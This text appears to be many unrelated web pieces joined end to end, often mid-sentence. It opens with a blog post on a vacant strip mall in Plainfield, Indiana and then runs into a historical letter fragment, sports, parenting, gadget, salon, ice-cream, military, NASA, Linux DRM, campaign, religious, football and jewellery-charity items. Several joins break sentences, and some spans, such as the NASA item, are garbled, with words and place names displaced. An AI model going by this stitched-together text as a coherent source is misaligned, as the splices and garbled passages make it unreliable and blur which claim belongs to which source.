Yes, a JC Penney, part of the Metropolis, a new open-air lifestyle center that has become the principal shopping hub for the city’s western suburbs. (The edge of the vacant WalMart is barely visible in the far left of the above photo.) Metropolis is still growing—not just finding more tenants but purchasing adjacent parcels for the intention of expanding its gross leasable area. No doubt most of the tenants formerly housed in this completely vacant strip mall all moved to this new location, or to other, newer, more desirable strip malls in the area.
So, nothing profound here. But this is a particular black eye to a boom-burb like
, whose civic leaders would no doubt love to see this blight removed from the principal east-west artery in the city, which also happens to be US Highway 40, the historic Plainfield National Road. shows no evidence of being a suburb in decline; in fact, if anything, it has ascended to become one of the most prominent suburbs in recent years, competing with the more established northern suburbs at luring new arrivals to the Plainfield area. Yet the city still struggles with this broad swath of depressed, vacant real estate. What does this say about retail in general, and what can be done in scenarios like this, which are taking place all over the country? Here are my thoughts on why retail tenants in particular have to make the shift so often: Indianapolis
1) Location. By most regards, this is so obvious that it doesn’t merit consideration. We’ve all heard the maxim. But delving into the ramifications of retailers’ decisions to locate can reveal much more about loyalty to a specific shopping center or the lack thereof. The demographics in
favor this area; nearly every other shopping center along the Plainfield Main Street here is thriving or at least has an occupancy rate of 75% or more. I could speculate the lifecycle of this strip mall has transpired as follows: a) WalMart leadership recognized that the trade area for their store at the original blue-and-gray structure is growing rapidly since Plainfield matured from a humble little satellite of Indianapolis to a prominent suburb of over 25,000 people; b) the regional leadership at WalMart hurriedly bought a spot along the principal artery 1,000 feet away from the new store and built a supercenter nearly twice the size of the original; c) the other tenants at the old WalMart strip mall see customer traffic counts plummet with the departure of the anchor tenant; d) the burgeoning City of Plainfield entices a major new lifestyle mall development called Metropolis (creating a Planned Unit Development, or PUD, in their zoning ordinance facilitate it), just 1,000 feet in the opposite direction from the new WalMart; e) smaller in-line tenants depart the strip mall for newer, more attractive retail plazas in the city, including (but not limited to) the Metropolis lifestyle center when it opens in 2006. Doesn’t take a rocket scientist to figure this out, but the design of this shopping sarcophagus bears all the marks of long-faded glory: the vinyl awning crowning a fake stucco façade was a popular motif from about 1990, and the complete absence of landscaping in the parking lot generates the uncomfortable heat island effect in the summer while rendering the overall design stale and uninviting. (Compare most new strip malls with elaborate landscaped islands, even when city ordinances don’t require them.) The decline of this strip mall happened so quickly the property managers probably had little time to react, which provides an excellent transition to the next point.
2) Leasing agreements. The managers of these shopping centers are often required to devote most of their energies to securing an anchor tenant: because these tenants absorb a preponderance of leasable space and generate both high sales volumes and customer traffic, owners and managers generally entice them with incredibly generous rents, sometimes offering a lease with no rent at all. Sometimes they even sell the property to the anchor tenant. Thus, the manager’s revenue depends on leases from the other in-line tenants, who may settle for a flat rent rate for a set number of years (typically less than five) but more often then not will negotiate a rent based on existing market conditions, where it will “step up” over time or correlated to the consumer price index. In-line tenants may often pay the preponderance of common area maintenance. These onuses suffered by the smaller retailers (and the dependence owners have on them for the revenue) means these agreements can be highly competitive. And since owner typically focus on finding stable anchors, the small in-line tenants enjoy freedom to shop for the best deal, which usually factors in rents, Common Area Maintenance (CAM) costs, and the desirability of an anchor tenant, among other things. Fidelity to a certain shopping center will scarcely last beyond the terms of a lease, and both anchors and in-line tenants are always seeking better deals.
3) Easy finance. So if the market is so competitive, why build so many new shopping centers in the first place? This is where my own knowledge gets foggy, and I can only hope to quote others more informed than I am. The sour economy has precipitated a steep rise in shopping center vacancies; as an article by Stacy Mitchell from the New Rules Project puts it, “the forces driving retail expansion have become untethered from actual consumer demand.” But how are developers able to access financing so easily when the battered retail landscape sits in plain view to even the most untrained eyes? According to White and Gray (1996) in their book Shopping Centers and Other Retail Properties, the emergence of the Real Estate Investment Trust (REIT) in the early 1990s transformed the landscape of shopping centers that were often family-run and guarded their financial data carefully, to public ownership of real estate in which the data became widely available. The reliance of public markets as a source of capital also opened the floodgates to a variety of participants in shopping center finance, allowing developers to find the exact type of security that meets the their desired return on investment and risk tolerance at that point in a market cycle (pp. 77-78). The continued proliferation of powerful REITs has most likely influenced the development of new large-scale shopping malls—thus explaining why in the late 1990s and early 2000s new mega-malls were constructed concurrent with others malls dying just a few miles away. This phenomenon embodies that culture that allows the creation of
’s Metropolis Mall, but what about the smaller retail casualties featured in this picture? Plainfield
4) Easy credit and standardization. Retail is an exhaustively bifurcated discipline; dare I anger the intelligentsia by calling it a “science” or “art form”? That said, in the United States, for the most part it is quite easy to build a shopping center; site clearance in many exurban or suburban areas such as Plainfield is relatively free of barriers. In places where permitting for retail is easy to obtain (which is most of the country), the costs stay low and the risk of delays pushing it outside a favorable market cycle are minimal. Thus, many amateur developers will cut their teeth with a simple strip mall at an intersection where a subdivision is going up in one of the other four corners. Strip malls are cheap if they lack any of the frou-frou, and often they don’t need frills to lure tenants if the demographics there favor growth. Thus, a site can attract tenants without a great promotional budget, and because they were cheap, even a mediocre occupancy rate should generate enough
NOI to allow the developer/owner to amortize quickly. In fact, spending money for a shopping center with high design standards might seem unwise, because the aesthetic will seem dated within a few years, demoting it from prime retail status once the neighborhoods around it are fully built out with residential and the new exurban frontier is just a few miles further away. By this time, it doesn’t matter—it appears better to stick to a mass market design with the loans the developer received, reflecting undemanding consumer tastes in the same way that the abundance of available credit for consumers has diluted demand for quality or durability. After all, why be choosy with the products one buys, whether they’re refrigerators, clothes, or real estate, when there’s plenty more money available to upgrade or replace?
Thus, we get strip malls like this one in
. Clearly the owner is making no money on it now, but it may have been fully profitable and amortized during its 10 to 15 year lifespan. And today, a strip mall from (as my estimates put it) between 1985 and 1989 is a full 3 or 4 acres of abandoned property. It is obsolete, like many of the homes in Midwestern inner-cities. Straight-line depreciation rules typically place a non-residential building at 39 years, though this accounts for office space far more effectively than retail, which most documentation would suggest has a much shorter life. Recent bills have favored reducing retail straight-line depreciation to fifteen years. Conversely, some strip malls enjoy a second life through extensive renovations and upgrades, often adding features such as landscaped grid in the parking lots or wooden signage that endow them with upmarket features the Plainfield strip mall clearly avoided at its inception. As mentioned before, elaborate landscaping was a luxury until about a decade ago; now it has become standardized as a means of attracting customers. The Cincinnati developer Phillips Edison has integrated the purchase of underperforming shopping centers into its mission statement, and it usually works to instill new life through upgrades that make the shopping centers more fashionable and aesthetic. Thus, through the obsolescence of 15-year-old strip mall designs, a new caliber of standardization emerges, higher than the one from a decade prior but equally mass produced. No doubt in another decade or two, an additional design element will enter the strip mall design standard, making it increasingly easy to estimate the age of a retail center simply by its appearance. Plainfield
Where does this leave the blighted strip malls of
? A firm like Phillips Edison would no doubt have a field day with them: the town itself is fiscally healthy and poised to grow further. However, the city is saturated with retail. Our current recession’s most enduring incarnation maybe the miles of vacant retail without a developer willing to shell out the money to refurbish it, proving that the consumerist infrastructure responded to a demand that was artificially inflated by our previously limitless access to credit. The consumer body is too big for its retail clothes, and, with far greater limitations to credit now in place, it may take time for us to grow back into all the empty storefronts built at a time when Americans had plugged themselves into a relentless buy-buy-buy ethos. In due time, this eyesore along Highway 40, Plainfield ’s Plainfield Main Street, will find a redeveloper, though its second life might not be strictly commercial.
Retail may be fickle, but it is only as fickle as the perpetually picky buyer. The lack of loyalty that a retailer has to a certain spot only reflect the customers’ own lack of loyalty to a particular shopping center, mall, or retail typology altogether. If the current recession really does impel the American populace toward a newfound parsimony and reluctance to buy everything in sight, perhaps the average shopping center’s depreciation time will slow. Otherwise, we are only witnessing a pause button on the perpetual flurry of consumers to buy the newest and shiniest (if not necessary the highest quality), and shopping centers will continue to find their butterfly nets are out of reach of the choicest retailers in only a dozen years or less.
These trends are obviously not new: they precipitated the decline of
Main Street retail well over a generation ago. And shopping centers were rising and falling during the 1990s boom as well. I’ll conclude with the fitting opening of a favorite, obscure movie of mine, Michael Tolkin’s 1994 opus The New Age, which begins with Katherine Witmer, a successful Los Angeles graphic designer (played by Judy Davis) in an exasperated call with one of her clients:
Katherine: Barry, what are you saying? But Barry . . . Barry . . . you owe me thirty-eight thousand dollars! Barry, Barry . . . you promised me that money. Well, thank you Barry. Good-bye, Barry. (Very calmly and deliberately, Katherine starts to erase all the files on her computer.)
Sue: [her assistant] What did Barry say?
Katherine: Barry was fired.
Sue: Wow, too bad, I like[d] Barry.
(Katherine quietly drags her mouse and begins to erase all of her bank files.)
Sue: Katherine, what are you doing? . . . Katherine, you’re erasing all the files. Wait, we haven’t back up these files yet! Katherine, you’re destroying all your work.
Katherine: (while she’s erasing) The bank doesn’t need a hundred thousand brochures because the bank doesn’t exist anymore. The bank doesn’t exist anymore because too many of its big real estate loans went bad. Its great big real estate loans went bad because it made loans for shopping centers that can’t find enough tenants. The shopping centers can’t find enough tenants because there are too many shopping centers! There are too many shopping centers because a lot of greedy fucks got loans from corrupt banks.
Sue: What are you going to do?
Katherine: I’m going shopping.

The strip mall with the Value City actually housed the first Wal-Mart we had in this town, then they built the blue structure around...1990 I think. Then in the mid 2000's, they bulldozed the trailer park just east of the first location and put up the current Wal-Mart. I too, am a little disgusted by the empty husks of buildings that Wally world seems to leave in it's wake...The blue strip mall now houses a Burlington(not a great sign, but better than nothing I suppose) and a barbecue joint where that Mexican restaurant was. The strip mall with the Value City also houses a location for an upcoming gym chain(Planet Fitness). I consider these places eyesores, but some occupancy is better than none...
(I love this blog by the way, your posts about the County Line Mall in Greenwood, Lafayette Square and Washington Square are total nostalgia trips for me.)
Thanks for your comments, Sam and Wendy. I agree, Sam, that sometimes the only way to rationalize the seemingly epidemic-level growth of vacant retail is to recognize that any occupied retail is an improvement over abandonment, no matter how low-rent that retail might be. (Besides, just the fact that I'm using the word "low-rent" is a bit of an elitist judgment call on my part.)
I appreciate the feedback and welcome more, as I continue to work to roll out a new American Dirt on my own domain. Stay tuned.In the letter I had the honor to write your Lordship on the 30th September No 3, I mentioned that some of the Spaniards who
I had very soon after an opportunity of talking over the matter with Mr Haslen a Gentleman of character in this place, to whom the vessel was addressed. I related to him the Spaniards Story expressed to him my great concern that they should suffer any injurious Treatment and requested that he would interpose his goodr Haslen said he wished the affair to be settled amicably with all his heart but that the Master of the vessel who was a man of excellent Character and had delayed his vessel many weeks at great disadvantage partly to accomodate these people thought himself so very ill used by them, that he had arrested them by advice of Counsel for the performance of their contract and was resolved since he could not otherwise deal with them that their difference should be decided at Law and at the same time to show his inclination to an amicable determination was willing to refer it to the decision of the other three of their Countrymen, who were going with him, that the Master finding these people troublesome would gladly have got rid of them at loss to himself and would have been satisfied with the hundred Dollars paid him rather than had further trouble about them if they had not inveigled away some of their Countrymen whom he had engaged as Mariners for the voyage and thereby exposed his vessel lying in a dangerous road, to great peril, here the matter rested, after some few days I was informed by Mr Haslen that at the instance of the other three passengers, Don Migiel and his Companions had satisfied the Master of the vessel and paid his demand amounting in the whole (including one hundred dollars paid at their quitting the vessel) to one hundred and fifty two dollars, and six shillings together with costs of suit amounting to twenty five dollars and one shilling and four pence.
I have since heard my Lord, that the people who remain here express great discontent at this transaction and threaten to complain to their Court, lest they should do so, with or without reason, I have thought it my duty to be thus particular in my relation to your Lordship of the Facts which have come to my knowledge concerning them.
The Master of the vessel bears a very good character, I therefore hope he will be able to acquit himself if he shall be called upon. I can assure your Lordship that I felt extreme concern at seeing Foreigners in such a predicament without power to interpose otherwise than I did, they settled their difference among themselves at last without my knowledge, or participation. Whether the settlement is equitable or not is impossible for me to determine as they are disagreed about it. It appears that there is great animosity

Anton's brother Rio, himself fined for a racial taunt against Ashley Cole, had different ideas though, as he refused to wear the Kick It Out T-shirt that all players wore before Manchester United's 4-2 win against Stoke despite manager Alex Ferguson's assertion that "everyone should be united" in wearing them at his Friday press conference.
Ferguson was responding to Reading striker Jason Roberts' declaration that he would not wear the shirt before his side's match against Liverpool because he felt the Kick It Out organization's response to the Terry and Luis Suarez incidents weren't "strong enough." Ferguson disagreed with Roberts' position, though, saying, "He really should be supporting all the other players who are doing it" on Friday.
Following the match against Stoke, Ferguson expressed his disappointment about Ferdinand's quiet choice to defy his wishes. From the Guardian:."
By not explaining his decision to his manager, let alone anyone else, before breaking from the rest of his team in not wearing the shirt, Ferdinand's act comes off as petulant and it seems Ferguson is taking it more as a personal affront than a noble stand against a toothless campaign. Reading manager Brian McDermott, meanwhile, fully supported Roberts' protest because Roberts spoke to him first instead of making it a last-minute surprise. "I support him 100 percent," McDermott said. "He had his reasons. Jason had his view and it was a very strong view. We spoke on Friday and I totally respect his view."
But while Roberts and Ferdinand feel the need to protest Kick It Out, former England goalkeeper David James has said that football's anti-racism groups like Kick It Out are doing too much in order to "keep themselves in existence."
Yet in the end, this is still just a T-shirt. Ferdinand and Roberts' decision not to wear it is going to have the same non-effect on the fight against racism in football as wearing the T-shirts have had for years now. Though the official responses to racial incidents often isn't ideal, the problem was never going to perfectly eradicated overnight just as it hasn't been in the larger scope of society. But, for the moment, Alex Ferguson is probably more concerned with how one of his players actually dared to go against him without so much as an explanation.

“I still like Batman, mom. He’s just not my favorite anymore.”
We were having a conversation about Halloween, Anders’ favorite holiday. I suspect he loves it so much because it is the one day of the year when everyone else around him dresses the way he likes to dress on a regular basis — in costume. Anders begins planning his next Halloween on November 1st, despite the fact that, in his case, it requires very little planning at all. He has been Batman for four of the last five Halloweens.
Recently, his ‘favorite’ has changed, a fact that caught me by surprise when he made his firm declaration from the backseat. “I want to be a penguin for Halloween this year or a cat. Not Batman, okay?”
Anders’ obsession with the Caped Crusader began at two years old when for Christmas his dad gave him a Batcave playset, a gift I was certain he was too young to enjoy. For three years now, that Batcave has been his favorite toy to play with. We’ve spent hours together setting up action figures and acting out scenes from Batman cartoons.
Lately, his pretend play has centered more around animals and his mountain of super hero gear has been gathering dust. So his admission served to confirm what I should have already gathered from his actions.
I have written countless stories about my son and his love for super heroes. It is a world of make-believe he has been immersed in for most of his life. While most children fall in and out of phases — Sesame Street, Thomas the Train, dinosaurs — Anders’ obsession has been steadfast.
He introduced himself to his teacher on the first day of preschool as “Anders Batman” and he has spent more days with a cape draped about his shoulders than without. I’ve become accustomed to the smiles of strangers as I pushed a masked little boy around the store aisles in my grocery cart.
Those days are now at a close and, while I can’t say I’ll miss watching and re-watching those same tired cartoons, it is a stage I’m very sad to see go.

Available for pre-order on Kickstarter starting today, the Lunecase harnesses the handset’s electromagnetic emissions to power itself, lighting up its backside to show when you have an incoming call or text. Though it is not connected to the phone, the case knows when you are receiving a voice call or SMS based on the cell signals that pass through it.
Ukrainian startup Concepter has set a goal of $50,000 for its Kickstarter campaign and hopes to ship the first units in August of this year. The first 200 backers will be able to pre-order a black Lunecase for a pledge of just $29 while the next 500 must pledge a minimum of $35 for a choice of black of white case.
MORE: 10 Tips Every iPhone Owner Should Know
After those first 700 pledges, additional backers can preorder either color case for iPhone 5s or 5c for $39, a discount off of the $50 MSRP. The case comes in either iPhone 5/5s or iPhone 5c sizes. The company is also offering custom-engraved Lunecases for those who pledge $99 or more.
We first saw the Lunecase at CES 2014, and we were blown away by its unique ability to grab power and data out of mid-air. The demo we saw featured a black case with a green ring that lit up when the phone received a call. However, the final production cases will have two separate indicators, a light that looks like a phone and powers up when you receive a call and another that looks like a speech bubble that illuminates when you have an incoming text.
A number of iPhone cases, including the FLASHr and VanD flashing case, use the iPhone’s LED flash to light up when you receive an alert. However, the Lunecase is the first product we’ve seen that uses electromagnetic radiation — essentially a waste product — for power. The Lunecase only works with the iPhone 5, 5s and 5c, but a Concepter rep told us at CES that the company may eventually build versions for other handsets.A.I.

The Jetsons made life look so easy—everything from commuting to work to making a soufflé could be done with a push of a button. While those inventions have yet to be created, today's salon owners have found a machine that increases retail sales, entertains clients and just plain looks good: flat-screen televisions. They're no impulse buy—a 15-inch model can cost you $350—but they may be worth the cost. Here, three salon owners with different budgets explain why.
FOR THE BUDGET-CONSCIOUS The decision to purchase plasma televisions for his salon was a no-brainer for Gaven Smith, owner of Studio Gaven Hair Colour in Franklin, TN. Once Smith's accountant told him the high-tech items were tax-deductible, he purchased computer equipment and three 48-inch plasma EDTV televisions. Although they're of a lesser quality than their high-definition counterparts, the $2,000 TVs are easier on the wallet and get the job done, Smith says. "They're good for what I use them for," he explains. "They give a clear picture, they're small, they hang on the wall, and they're easy to mount. Plus, it doesn't take a lot of technology to run them to a DVD player. And if they blow up in a year, I can just buy new ones."
More than fancy wall decorations, the televisions also double as a marketing tool. Each strategically placed TV shows videos from manufacturers and footage from salon-sponsored community events. "Besides giving clients a point of interest to look at, the TVs help create our overall branding—that we are into technology and are loyalty-driven, education-based and manufacturer-backed," Smith says.
EVERYTHING IN MODERATION Connie and Richard Ouellette own three Angles
Salons and Day Spas in Southern California. Perched on a movable arm at each styling station is a 6½-inch LCD television with a touch screen that clients use to navigate through a content loop of fashion shows, a virtual tour of the salon or regular public TV programs. Since installing the sets a year ago, the Ouellettes' salons have already seen an improvement in their bottom line. "A client may come into the salon and not know everything that's available to her," Ouellette says. "On the TV, she can see the information and maybe take advantage of other services we have."
Before investing in expensive electronics, Ouellette suggests finding out if they can satisfy your salon's needs. "I think you have to know your salon, your clients and your stylists and see if they're on a high-tech track," she says. "You have to know if it's right for you."
WHEN MONEY IS NO OBJECT Walk into Leonardo Rocco's salon, Rocco Donna Hair & Beauty Art, on legendary Ocean Drive in Miami Beach, and you'll feel like you just stepped into the future. All five styling stations have their own plasma televisions, and a 50-inch screen hangs on the wall in the waiting area. The screens send a clear message to clients that Rocco Donna is an innovative salon. "The main idea was to create a different place, with a special atmosphere," Rocco says. "We show anything that has to do with fashion, from runway shows to photo shoots to music videos." Rocco went all out, spending a total of $60,000 and installing a Bose system, automatic lights and an "on demand" video system for each screen. The expense is paying off: Clients and potential employees can see that Rocco Donna salon is committed to keeping up with technological advances.Madame Tussauds in Blackpool revealed Lady Gaga's 10th wax figure new look in time for Christmas.

City's excitement grows as brand eyes return to stores
This article was published April 5, 2012 at 10:18 a.m.
PHOTO BY GAVIN LESNICK
A potential bidder looks over Yarnell's freezers at a bankruptcy auction last year. The auction ultimately culminated with a Chicago company buying all the assets. Yarnell's is expected to be back on store shelves soon.
- aAFont Size
LITTLE ROCK Mayor David Morris remembers well the 4 a.m. phone call last year alerting him that Searcy-based Yarnell's Ice Cream was shutting down after 80 years.
It was June 30, Morris recalled, and the overnight workers at the downtown production facility had just learned the bankrupt company's financial problems had reached the breaking point.
"They told them they were ceasing production," Morris said. "What a doom-and-gloom picture was painted that day."
A little more than 9 months later, that doom-and-gloom has largely been replaced by optimism. After a bankruptcy proceeding that saw a Chicago-based company emerge with the Yarnell's assets, the ice cream line has hired back at least some of its workers and resumed production.
A Yarnell's spokesman declined to discuss details of the work or plans for the brand's reemergence in retail freezers, but said a major announcement is set for April 19. Morris said ice cream will be delivered to the governor that day during a news conference at the state Capitol.
After the sudden shutdown, a bankruptcy trustee oversaw an auction last November that ultimately culminated in Chicago-based snack manufacturer Schulze & Burch Biscuit Co. buying everything from recipes to real estate for roughly $1.3 million.
Morris said city and Chamber of Commerce officials worked tirelessly to help complete the deal. Schulze & Burch already had a presence in Searcy and planned right away to bring Yarnell's back to market, a far more attractive option for the city than a buyer who wanted to shut the facility down and sell off its equipment.
It's hard to describe how much excitement the Yarnell's return has generated in Searcy, the mayor said.
"Oh my - it's just people are elated by the fact that production has started," he said, adding he thinks the brand will be back in stores soon. "People have been put back to work. We're going to see products back on the shelf."
That excitement was on full display earlier this week. An advertising company producing a commercial for Yarnell's wanted some of the town to turn out to simulate a parade, Morris said, so a call for extras was spread through the local paper, e-mail and word of mouth.
The turnout was enormous, Morris said, and the simulated shoot turned into a good-faith show of support for brand which Morris said the town considers "iconic."
"It's a Cinderella story come true," he said. "How much better an ending could we have had?"

Notes: To RSVP Email: yolanta@bu.eduvia DvidshubThe Marine Corps sent two female Lieutenants to Marine Corps Infantry Officers Course in Quantico on Sept. 24 for the first time ever.
By last week both women had washed out.
Tom Bowmen at NPR reports the first woman was out the first day into the 68 day course, and the second failed last week after she could not complete two events due to medical reasons.
None of the training had been changed, or altered — In enlisted boot camp, as well as in the fleet Marine Corps, women have different physical fitness standards than men.
So we talked to a few Marine Corps Infantry Officers to get a feel for what these Marines were in for. The consensus was that the course was "one of the most rigorous the Marine Corps has to offer."
The two women were the first in a batch of 100 or so the Marines will run through the course as part of their evaluation.

I couldn't help but keep to heart "or you simply rely on your own sense of approaching dread" in the rules
. I thought to myself, just how terrifying it'd be to wake up to one of these guys one night. Based on the definition alone of insidious, I may not know if they're evil, but they're certainly not pleasant to see. Enjoy! And Thank You!
EPİC ! This is absuletly EPİC !
Thank you!
You're Welcome !
Wow, is excellent and creative
Thank you!
Oh, no problem, is a beautiful work
Very well done. Great job!! (:
Thank you!
Awewsome
Thank you!
this sent chills down my neck. Amazing! Creepy! You hit the nail with this one... I love how the child is clutching the teddy bear for dear life. the color scheme adds to the feeling of dread. again.... amazing
Thank you so much! Wish me luck!
I've looked through the entries and I don't think you need luck on this one, you've got the best entry... I hope whoever is judging feels the same
That means millions, zhead
Thank you!
epic work dude ! check out my entry when u get the chance good luck .
It looks scary but it looks very awesome. This kind of gave me the feeling I get after watching some horror anime, and then just lying there, listening to every noise and thinking 'Oh got, the titans/mummies/whatever are coming... Kill me now..' But then I just fall asleep, and when I wake up, I forgot it all. Awesome.
Lol Thank you!
I hear you, depending on what's on, it can make falling asleep into an adventure.
I know right?
This rings bells of "Dark SKies" more to me! But still very nice!
Yeeaah, granted it doesn't exactly involve the type of supernatural we're expecting, but like I mentioned before, that saying in the rules, I couldn't resist being a tad deviant(no pun intended lol) Thank you though!

As the sun sets on its space shuttle program, NASA has turned to its employees to design a patch.
(collectSPACE/NASA)
November 11, 2009
— With just six space shuttle flights remaining, the next scheduled to lift off next week, NASA has invited its past and present space program workers to design an emblem to mark the end of the shuttle era. The winning design will be flown on the shuttle before the fleet retires.
The patch design contest, which began Oct. 15 and runs through the first of next month, takes its inspiration from a
tradition among shuttle crew
 Sep. 2010. Over the program's 30 years, the five shuttle orbiters have deployed satellites, planetary probes and observatories, including the
Hubble Space Telescope
, as well as visited the Russian Mir space station and led the assembly of the International Space Station (ISS).
The latter is still on-going with STS-129, the sixth to last shuttle mission scheduled to launch to the ISS on Nov. 16 with a six-person crew. described. .
"So it should be fun for them and it gives them a chance to be a part of shuttle history."
A note to NASA workers: if you enter this patch contest, collectSPACE invites you to
show us your design

This one ties the DRM firmly to a specific device. It should break systems with old X Servers and multiple heads that are DRI-capable in that some heads won't init the DRI, but nothing else. This sort of configuration has been relatively broken anyway, so it's not too big a deal. It removes some ugliness from the DRM, and will make future changes like the lower-level graphics layer more doable. Also, the DRM no longer offers a service of getting the irq of any pci device (now it's restricted to just the device the DRM is attached to), and the ioctl to install the irq handler no longer cares about the irq number that was set if the interface version is set high enough (1.2).
The nice part is this change doesn't even mean any modifications to the X Server, though it'll remove some code from the kdrive DRI implementation I'm working on since I'm going to insist on up to date DRM for that.Procurement Training and Certification

In the final week of his U.S. Senate campaign, Roy Blunt rolled into Fulton Wednesday afternoon on his 50-stop “Victory for Missouri Jobs” bus tour.
Blunt stopped in downtown Fulton at Republican Party headquarters and was joined on the bus tour by retiring U.S. Sen. Christopher S. “Kit” Bond, Ninth District Congressman Blaine Luetkemeyer, and Missouri Senate candidate Mike Kehoe.
Joining him in Fulton were Christine Kleindienst, Republican candidate for Callaway County recorder, and Denise Hubbard, Republican candidate for Callaway County clerk.
Bond, who grew up in nearby Mexico, said he was especially pleased in Callaway County to see so many Republican candidates for county offices this year.
During his campaign, Blunt has visited all 114 counties and has met with Missourians in more than 870 events. Blunt said his stop in Fulton is the 10th stop in his bus tour in the last two days on his way to his last 50 stops up until election day on Nov. 2.
Blunt said the message he is hearing is that Missourians are feeling their freedom slipping away and they are deeply concerned.
“The choice is clear,” Blunt said, “Missourians can choose to give another vote to Barack Obama, Harry Reid and Nancy Pelosi and their extreme job-killing agenda by supporting my opponent. Or they can choose someone who will fight for Missouri jobs and Missouri families by supporting our campaign.”
Blunt said the election is about whether the government is bigger than the people or whether the people are bigger than the government. “I think the people are going to win,” he said.
“Missourians are asking ‘where are the private sector jobs, and why is the federal government spending much more money than it ever has before?’ We must encourage the creation of private sector jobs and stop out-of-control spending in Washington,” Blunt said.
Blunt said voters can check out his jobs plan at on the Internet.
Blunt said the Democrats are proposing a cap and trade energy plan that would double every American’s utility bill. Blunt said the bill passed the House but fortunately was blocked in the Senate.
“The stimulus package clearly did not work. It was supposed to guarantee that unemployment would not go above 8 percent. But it has been almost 10 percent ever since,” Blunt said.
Blunt said the the bill for all of the excess spending is passed on to future generations. “The nation is now $800 billion more in debt. It’s like at a family reunion where everyone got anything they wanted to order at a restaurant and the bill for the dinner is passed to a 7-year-old niece. She has the least to say about what was going on and has the least ability to pay,” Blunt said. “I think the country is embarrassed about it.”
“The biggest unreported story in America in the last 18 months,” Blunt said, “is that there is a big bipartisan vote in Washington. It’s the no vote. The 34 Democrats who voted with all of the Republicans on the health care bill. And the 40 some Democrats who voted with the Republicans on cap and trade. If the Obama agenda is too extreme for Democrats in Washington, it’s way too extreme for a whole bunch of Democrats in Missouri. The Democrats that we work with and go to school with or run into at a soccer game or the grocery store. It’s way to extreme for them,” Blunt said.

Bringing a spiritual perspective to daily life
September 11, 2001, my son, like many other Chicagoans, left work mid-morning. He came over to be with me, just as his father 60 years earlier had come over to the college dorm where I was living December 7, 1941, the day Pearl Harbor was attacked.
There are not too many similarities in the details of the beginning of these two wars World War II and the war on terrorism but their very essence is the same. It is essentially a battle to find good supreme. And because the earlier battle chronicled the answered prayers for the supremacy of good, we can expect the prayers for victory today also to be answered.
The challenge now, as it was earlier, is to keep praying earnestly and fervently.
Mary Baker Eddy, the founder of this newspaper, advised at the time of an earlier armed conflict that her fellow citizens "Pray for the prosperity of our country, and for her victory under arms; that justice, mercy, and peace continue to characterize her government, and that they shall rule all nations" ("Christian Science versus Pantheism," pg. 14).
Such prayers are not seeking victory for one nation over another nation, one people over another people, one religion over another religion. This prayer for justice, mercy, and peace to prevail is universal and timeless. It is a good basis for our prayers today. Praying for justice, mercy, and peace to continue flows from recognizing spiritual continuity, and it honors the good already achieved wherever found.
Such general prayer for all nations and peoples may well be followed by specific prayers for their citizens. One of the most effective prayers we can utter is the recognition that God did not create evildoers. Sometimes this is very challenging to do, but separating evil from the divine creation separates it from power and even from creditable presence.
The Gospel according to St. John begins with an inspiring declaration of what Christ is. The writer sees this manifestation of God as light and says: "That was the true Light, which lighteth every man that cometh into the world" (John 1:9). It may call for some stretching to accept that the real selfhood of anyone, and indeed of terrorists, is actually Christlike. But this truth that defines God's creation is a forever fact.
We can call upon the light of Christ, Truth, which is always speaking to the human consciousness the facts of God's allness and goodness. Seeing the nature of God, we find the true nature of ourselves and of all others.
"Know thyself, and God will supply the wisdom and the occasion for a victory over evil," wrote Mrs. Eddy ("Science and Health with Key to the Scriptures," pg. 571). To me, this self-knowledge has two components: to see myself, as well as all others, in the light that Truth sheds on us; and to include an honest appraisal of my thoughts and actions. This honest view of ourselves keeps us open to the wisdom first before the occasion for a victory over evil. In a way this true self-knowledge is the light that lighteth everyone who "cometh into the world."
We may view this light as both the actual and potential selfhood of everyone. However considered, the fact is that everyone, without exception, whether they know it or not, reflects the light of godliness. Prayers that acknowledge this are sure to bring victory in the battle of good over evil.
During one week recently, a friend of mine recounted having dinner with Japanese friends who were visiting the United States. She commented how much she enjoyed this couple. My son then told me of his plans to attend the wedding of a friend who earlier had moved to Germany and was marrying a citizen of that country. Sixty years ago, Japan and Germany were the enemy. The citizens of these countries were the ones we struggled to see in their true spiritual light. And these nations were ones for which we prayed to see expressing justice, mercy, and peace.
Years from now when we remember and honor September 11, we can expect the heartache of this day to have been assuaged by another victory over evil the victory of answered prayer.primary navigation

Four observations from pregame warmups.
1. Sebastian Vollmer worked as the starting right tackle throughout warmups, and that combination always holds true for the game. The starting line consisted of Nate Solder, Donald Thomas, Ryan Wendell, Dan Connolly and Vollmer.
2. The starting secondary, based on warmups, again included Aqib Talib (left) and Alfonzo Dennard (right) at corner and Devin McCourty and Steve Gregory at safety. The defensive combinations don't always hold true for the game.
3. It looks like Trevor Scott will be starting at defensive end in four-man fronts. Rob Ninkovich is playing on Chandler Jones' side.
4. The Patriots are wearing their home blues, and the Dolphins chose to wear their all white uniforms. The home team chooses its eight uniform combinations before the season, and this is becoming typical for a southern team to wear white at home, particularly against a northern team, because the sun is hotter on dark jerseys. It's in the high-70s today, so that shouldn't have much of an impact, if any at all.National Osteoporosis Society - Dazzler Campaign
Last Update: 09 Jan 2004
Sean has designed a code which forms the script for a series of jewels for
the Dazzler Campaign. The code is based on abstract sketches Sean created.
Cufflinks
Earrings
The Dazzler Campaign is a partnership between Emdico, London based
diamond merchants and Blondel Cluff, society jeweller and wife of mining
magnate, Algy Cluff. The purpose is to combine the glamour of diamonds
with a charitable element to it thus imparting a feel good factor to this
most intimate and emotional of purchases.
Three new cuts of diamonds have been created and patented. They gather
and reflect light in a very exciting way thus departing from the sheer
uniformity and commonness of the old style of cuts. These cuts are known
collectively as Cool Cuts and individually as Shiva, Heera and Amity.
A percentage of the sale of the wholesale price and a percentage of
retail sale prices have been pledged to charity. The current beneficiary
is the National Osteoporosis Society (NOS). Thus the glamour of diamond
has been combined with good health.
A wide range of celebrities have been invited to design a series of limited
edition jewellery using these cuts. The celebrities have pencilled their designs
and the dazzler campaign has produced this jewellery and offered it to
participating retailers. Sean Bean, Elton John, Phil Collins, Joanna Lumley,
Dawn French and Bruce Oldfield, Amanda Wakely from the fashion world
and Jewellery designer Theo Fennell and Stephen Webster have generously
donated their designs. In addition, several other celebrities have been
requested and have agreed to design something for the campaign.
Each jewel is produced in strictly limited numbers and is accompanied by a
Certificate of Authenticity which bears a unique number, also engraved on the
jewel.
In addition, a fabulous diamond necklace featuring the Shiva cut has been
donated to the NOS.
An extensive PR and advertising programme has been planned to showcase
the campaign.
The Diamond Trading Company has backed the project and has hailed it as
an innovative union of luxury and health.
All diamonds are sourced from conflict free sources and conforms to DTCs
best business practice principles.
